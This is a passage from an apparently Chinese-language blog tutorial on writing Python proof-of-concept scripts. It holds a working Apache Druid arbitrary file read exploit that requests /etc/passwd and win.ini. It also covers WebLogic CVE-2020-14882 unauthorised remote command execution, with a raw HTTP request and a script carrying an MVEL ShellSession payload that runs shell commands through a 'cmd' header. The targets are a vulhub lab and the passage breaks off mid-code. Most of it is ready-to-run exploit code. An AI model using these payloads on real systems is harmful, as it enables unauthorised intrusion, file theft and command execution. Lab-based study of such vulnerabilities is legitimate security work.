Poc()</span><br></pre></td></tr></table></figure></div><p>2、补全参数的输入，定义 <code>Poc(url)</code> 里面的  <code>url</code></p><p>将函数模块化后，利用 <code>argparse</code> 库将 <code>url</code> 值使用命令行的方式由用户去输入，编写为如下</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个解析对象parser，用于装载参数的容器</span></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&quot;usage：python3 demo.py -u [url]&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对这个解析对象添加几个命令行参数，type为输入类型，metavar用来控制部分命令行参数的显示，require=True为当用户输入错误时，系统返回提示正确的输入方式，help为描述</span></span><br><span class="line">parser.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--url&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&#x27;&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;Please input the vulnerable url&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实例化 parser</span></span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Poc</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="comment"># 自定义一个字典，用于存在验证的 payload，自定义 payload 区别系统版本，避免漏报</span></span><br><span class="line">    lists = [</span><br><span class="line">        <span class="string">&quot;file:///etc/passwd&quot;</span>,</span><br><span class="line">        <span class="string">&quot;file:///C:/Windows/win.ini&quot;</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置 headers</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> <span class="built_in">list</span> <span class="keyword">in</span> lists:</span><br><span class="line">            <span class="comment"># burp 抓取的漏洞 post 请求数据包，用于验证漏洞，主要触发点为 &quot;uris&quot; 的参数值，参数值利用 list 遍历 lists 列表的值</span></span><br><span class="line">            post_data = &#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;spec&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;ioConfig&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;inputSource&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;http&quot;</span>,<span class="string">&quot;uris&quot;</span>:[<span class="built_in">list</span>]&#125;,<span class="string">&quot;inputFormat&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;regex&quot;</span>,<span class="string">&quot;pattern&quot;</span>:<span class="string">&quot;(.*)&quot;</span>,<span class="string">&quot;columns&quot;</span>:[<span class="string">&quot;raw&quot;</span>]&#125;&#125;,<span class="string">&quot;dataSchema&quot;</span>:&#123;<span class="string">&quot;dataSource&quot;</span>:<span class="string">&quot;sample&quot;</span>,<span class="string">&quot;timestampSpec&quot;</span>:&#123;<span class="string">&quot;column&quot;</span>:<span class="string">&quot;!!!_no_such_column_!!!&quot;</span>,<span class="string">&quot;missingValue&quot;</span>:<span class="string">&quot;1970-01-01T00:00:00Z&quot;</span>&#125;,<span class="string">&quot;dimensionsSpec&quot;</span>:&#123;&#125;&#125;,<span class="string">&quot;tuningConfig&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>&#125;&#125;,<span class="string">&quot;samplerConfig&quot;</span>:&#123;<span class="string">&quot;numRows&quot;</span>:<span class="number">500</span>,<span class="string">&quot;timeoutMs&quot;</span>:<span class="number">15000</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 利用 requests 库请求目标，post 请求格式为 json=post_data,并使用 verify=False 和 allow_redirects=False 参数来发送带有禁用 SSL 验证和禁用重定向的请求</span></span><br><span class="line">            res = requests.post(url,json=post_data,headers=headers,verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 若 res 的 response 中存在 root:x 或者 [fonts] 字符则证明存在漏洞否则不存在漏洞</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;root:x&quot;</span> <span class="keyword">in</span> res.text <span class="keyword">or</span> <span class="string">&quot;[fonts]&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+] 存在 Apache Druid LoadData 任意文件读取漏洞 &quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] 不存在 Apache Druid LoadData 任意文件读取漏洞&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 请检查输入是否有误&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 固定格式，由于上面代码使用的模块化 def() 编写，所以下面需设置主函数进行执行脚本</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    Poc(args.url)</span><br></pre></td></tr></table></figure></div><p>如果不想继续美化下去，其实这时候脚本就已经编写完成了。</p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230516203856083.png" data-caption="image-20230516203856083"><img src="/../images/poc/image-20230516203856083.png" alt="image-20230516203856083"></a></p><p>3、具体更为完善的代码如下：</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 argparse 模块化</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">argument</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;usage：python3 demo.py -u [url]&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--url&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&#x27;&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;Please input the vulnerable url&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">return</span> args</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置一个 banner，美化脚本</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">banner</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  _______      ________    ___   ___ ___  __       ____    ________ _  _   ___  </span></span><br><span class="line"><span class="string"> / ____\ \    / /  ____|  |__ \ / _ \__ \/_ |     |___ \  / /____  | || | / _ \ </span></span><br><span class="line"><span class="string">| |     \ \  / /| |__ ______ ) | | | | ) || |______ __) |/ /_   / /| || || (_) |</span></span><br><span class="line"><span class="string">| |      \ \/ / |  __|______/ /| | | |/ / | |______|__ &lt;| &#x27;_ \ / / |__   _\__, |</span></span><br><span class="line"><span class="string">| |____   \  /  | |____    / /_| |_| / /_ | |      ___) | (_) / /     | |   / / </span></span><br><span class="line"><span class="string"> \_____|   \/   |______|  |____|\___/____||_|     |____/ \___/_/      |_|  /_/  </span></span><br><span class="line"><span class="string"> &quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Poc</span>():</span><br><span class="line">    <span class="comment"># 此模块是调用上面 def argument()，模块之间直接调用，将 argument() 函数赋值给 args，然后 url 被 args.url 定义用于参数化输入，最终 url 被 request.post 调用</span></span><br><span class="line">    args = argument()</span><br><span class="line">    url = args.url</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 漏洞验证 Paylaod ，设置一个 lists 列表存储</span></span><br><span class="line">    lists = [</span><br><span class="line">        <span class="string">&quot;file:///etc/passwd&quot;</span>,</span><br><span class="line">        <span class="string">&quot;file:///C:/Windows/win.ini&quot;</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># list 参数遍历已定义的 lists 参数值</span></span><br><span class="line">        <span class="keyword">for</span> <span class="built_in">list</span> <span class="keyword">in</span> lists:</span><br><span class="line">            <span class="comment"># burp 抓取的漏洞 post 请求数据包，用于验证漏洞，主要触发点为 &quot;uris&quot; 的参数值</span></span><br><span class="line">            post_data = &#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;spec&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;ioConfig&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;inputSource&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;http&quot;</span>,<span class="string">&quot;uris&quot;</span>:[<span class="built_in">list</span>]&#125;,<span class="string">&quot;inputFormat&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;regex&quot;</span>,<span class="string">&quot;pattern&quot;</span>:<span class="string">&quot;(.*)&quot;</span>,<span class="string">&quot;columns&quot;</span>:[<span class="string">&quot;raw&quot;</span>]&#125;&#125;,<span class="string">&quot;dataSchema&quot;</span>:&#123;<span class="string">&quot;dataSource&quot;</span>:<span class="string">&quot;sample&quot;</span>,<span class="string">&quot;timestampSpec&quot;</span>:&#123;<span class="string">&quot;column&quot;</span>:<span class="string">&quot;!!!_no_such_column_!!!&quot;</span>,<span class="string">&quot;missingValue&quot;</span>:<span class="string">&quot;1970-01-01T00:00:00Z&quot;</span>&#125;,<span class="string">&quot;dimensionsSpec&quot;</span>:&#123;&#125;&#125;,<span class="string">&quot;tuningConfig&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>&#125;&#125;,<span class="string">&quot;samplerConfig&quot;</span>:&#123;<span class="string">&quot;numRows&quot;</span>:<span class="number">500</span>,<span class="string">&quot;timeoutMs&quot;</span>:<span class="number">15000</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 利用 requests 库请求目标，post 请求格式为 json=post_data,并使用 verify=False 和 allow_redirects=False 参数来发送带有禁用 SSL 验证和禁用重定向的请求</span></span><br><span class="line">            res = requests.post(url,json=post_data,headers=headers,verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 若返回的响应中存在 &quot;root:x&quot; 或者 &quot;[fonts]&quot; 则证明存在漏洞，否则不存在</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;root:x&quot;</span> <span class="keyword">in</span> res.text <span class="keyword">or</span> <span class="string">&quot;[fonts]&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+] 存在 Apache Druid LoadData 任意文件读取漏洞 &quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] 不存在 Apache Druid LoadData 任意文件读取漏洞&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 请检查输入是否有误!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主函数先执行 banner() 里面的代码再执行 Poc() 里面的代码</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    banner()</span><br><span class="line">    Poc()</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230516204750654.png" data-caption="image-20230516204750654"><img src="/../images/poc/image-20230516204750654.png" alt="image-20230516204750654"></a></p><h2 id="四、远程命令执行（Remote-Command-Execution，RCE）"><a href="#四、远程命令执行（Remote-Command-Execution，RCE）" class="headerlink" title="四、远程命令执行（Remote Command Execution，RCE）"></a>四、远程命令执行（Remote Command Execution，RCE）</h2><h3 id="Weblogic-CVE-2020-14882-未授权远程命令执行"><a href="#Weblogic-CVE-2020-14882-未授权远程命令执行" class="headerlink" title="Weblogic CVE-2020-14882 未授权远程命令执行"></a>Weblogic CVE-2020-14882 未授权远程命令执行</h3><h4 id="环境搭建-2"><a href="#环境搭建-2" class="headerlink" title="环境搭建"></a>环境搭建</h4><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 下载 vulhub</span><br><span class="line">https://github.com/vulhub/vulhub</span><br><span class="line"></span><br><span class="line"># 进入 CVE-2020-14882 目录输入命令启动环境</span><br><span class="line">dodocker-compose up -d</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230517153416783.png" data-caption="image-20230517153416783"><img src="/../images/poc/image-20230517153416783.png" alt="image-20230517153416783"></a></p><p>访问后台 <a href="http://192.168.148.155:7001/console/login/LoginForm.jsp">http://192.168.148.155:7001/console/login/LoginForm.jsp</a></p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230517153520549.png" data-caption="image-20230517153520549"><img src="/../images/poc/image-20230517153520549.png" alt="image-20230517153520549"></a></p><p>环境本身所存在的未授权访问漏洞 <a href="http://192.168.148.155:7001/console/images/%252E%252E%252Fconsole.portal">http://192.168.148.155:7001/console/images/%252E%252E%252Fconsole.portal</a></p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230517153912607.png" data-caption="image-20230517153912607"><img src="/../images/poc/image-20230517153912607.png" alt="image-20230517153912607"></a></p><blockquote><p>影响版本：WebLogic Server 10.3.6.0.0、WebLogic Server 12.1.3.0.0、WebLogic Server 12.2.1.3.0、WebLogic Server 12.2.1.4.0、WebLogic Server 14.1.1.0.0</p></blockquote><h4 id="POC-代码编写分析-2"><a href="#POC-代码编写分析-2" class="headerlink" title="POC 代码编写分析"></a>POC 代码编写分析</h4><p>利用 Burp 抓取未授权访问后台的数据请求包</p><div class="highlight-wrap" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /console/images/%252E%252E%252Fconsole.portal HTTP/1.1</span><br><span class="line">Host: 192.168.148.155:7001</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-GB,en-US;q=0.9,en;q=0.8</span><br><span class="line">Cookie: ADMINCONSOLESESSION=qiYouAipOODZ7EX6YRB10uRorC89seTtqcXuf0nFoF3gthgLCDQ3!-1131641747</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230517171248795.png" data-caption="image-20230517171248795"><img src="/../images/poc/image-20230517171248795.png" alt="image-20230517171248795"></a></p><p>修改数据请求包为 POST，插入漏洞 Payload 触发漏洞，漏洞数据包如下：</p><div class="highlight-wrap" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /console/images/%252E%252E%252Fconsole.portal HTTP/1.1</span><br><span class="line">Host: 192.168.148.155:7001</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-GB,en-US;q=0.9,en;q=0.8</span><br><span class="line">Cookie: ADMINCONSOLESESSION=qiYouAipOODZ7EX6YRB10uRorC89seTtqcXuf0nFoF3gthgLCDQ3!-1131641747</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">cmd: ls</span><br><span class="line">Content-Length: 1223</span><br><span class="line"></span><br><span class="line">_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread(); weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField(&quot;connectionHandler&quot;); field.setAccessible(true); Object obj = field.get(adapter); weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod(&quot;getServletRequest&quot;).invoke(obj); String cmd = req.getHeader(&quot;cmd&quot;); String[] cmds = System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;window&quot;) ? new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125; : new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, cmd&#125;; if (cmd != null) &#123; String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(&quot;\\A&quot;).next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod(&quot;getResponse&quot;).invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush(); res.getWriter().write(&quot;&quot;); &#125;executeThread.interrupt(); &quot;);</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230517171550932.png" data-caption="image-20230517171550932"><img src="/../images/poc/image-20230517171550932.png" alt="image-20230517171550932"></a></p><h4 id="分析小结-2"><a href="#分析小结-2" class="headerlink" title="分析小结"></a>分析小结</h4><p>漏洞处于后台的 POST 请求，但由于存在未授权访问，所以登录认证不需要理会，在编写 Poc 只需定义好请求头以及请求包再处理返回的结果即可</p><blockquote><p>1、系统存在未授权访问，直接前台 GET 请求，但由于漏洞点为 POST 请求，所以漏洞验证时要将 GET 修改为 POST 请求 ，并定义好请求头以及请求体</p><p>2、当存在漏洞时返回命令执行的响应</p></blockquote><h4 id="Poc-初步编写-2"><a href="#Poc-初步编写-2" class="headerlink" title="Poc 初步编写"></a>Poc 初步编写</h4><p>根据上面的学习，我们已经基本了解 Poc 编写的简单流程了，按老规矩，先简单实现漏洞验证，再美化代码</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    ：demo.py</span></span><br><span class="line"><span class="string">@IDE     ：PyCharm</span></span><br><span class="line"><span class="string">@Author  ：Funsiooo</span></span><br><span class="line"><span class="string">@Blog    ：https://funsiooo.github.io</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> http.client</span><br><span class="line"></span><br><span class="line"><span class="comment"># 强制使用 HTTP/1.0 协议版本进行请求，而不是默认的 HTTP/1.1 版本,有些服务器可能对特定的协议版本有要求或限制,通过将协议版本设置为 HTTP/1.0，或许用于试图绕过一些与 HTTP/1.1，相关的限制或问题，具体没深究</span></span><br><span class="line">http.client.HTTPConnection._http_vsn_str = <span class="string">&#x27;HTTP/1.0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置未授权的后台链接</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.148.155:7001/console/images/%252E%252E%252Fconsole.portal&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 因为我们请求链接为 GET 方法,请求头没有处理 POST 请求体的 headers 头，这边需要自定义一个 headers 头，确保能进行 POST 请求，主要需要添加 Content-Type 以及定义命令执行参数 cmd</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 &#x27;</span></span><br><span class="line">                         <span class="string">&#x27;Safari/537.36&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,&#x27;</span></span><br><span class="line">                     <span class="string">&#x27;*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en-GB,en-US;q=0.9,en;q=0.8&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;cmd&#x27;</span>: <span class="string">&#x27;ls&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># POST 请求体，注意这里和上面的 POST 数据包有所不一样，上面的 POST 请求都是参数化，参数与参数值均需要使用单引号或者双引号包括，该脚本是直接使用&#x27;&#x27;&#x27; &#x27;&#x27;&#x27; 包括字符即可</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&#x27;weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread();weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork();java.lang.reflect.Field field = adapter.getClass().getDeclaredField(&quot;connectionHandler&quot;);field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod(&quot;getServletRequest&quot;).invoke(obj);String cmd = req.getHeader(&quot;cmd&quot;);String[] cmds = System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;window&quot;) ? new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125; : new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, cmd&#125;;if (cmd != null) &#123;String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(&quot;\\\A&quot;).next();weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod(&quot;getResponse&quot;).invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();res.getWriter().write(&quot;&quot;);&#125;executeThread.interrupt();&#x27;)&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 requests 进行 POST 请求</span></span><br><span class="line">res = requests.post(url, data=payload, headers=headers, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出响应文本</span></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230518095506669.png" data-caption="image-20230518095506669"><img src="/../images/poc/image-20230518095506669.png" alt="image-20230518095506669"></a></p><h4 id="完善代码-2"><a href="#完善代码-2" class="headerlink" title="完善代码"></a>完善代码</h4><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 